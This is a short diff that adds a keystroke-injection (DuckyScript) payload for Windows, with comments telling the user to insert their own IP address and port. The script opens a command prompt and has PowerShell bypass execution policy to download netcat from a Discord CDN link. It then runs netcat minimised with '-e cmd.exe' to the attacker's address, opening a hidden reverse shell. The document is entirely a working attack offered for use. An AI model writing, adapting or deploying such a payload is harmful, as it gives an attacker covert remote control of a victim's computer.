@@ -1,0 +1,17 @@
+COM Change The IP and the Port, and for the netcat download link you can use it but it sure will expired so change it
+COM for the ip address and the port pls do remove this symbol (<>) 
+
+DELAY 1000
+GUI r
+DELAY 1000
+
+STRING cmd
+ENTER
+DELAY 1000
+
+STRING cd / & mkdir win & cd win & echo (wget 'https://cdn.discordapp.com/attachments/823520101415911464/826813046500491264/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1
+ENTER
+DELAY 3000
+
+STRING START /MIN a.exe <IP ADDRESS> <PORT> -e cmd.exe -d & exit
+ENTER
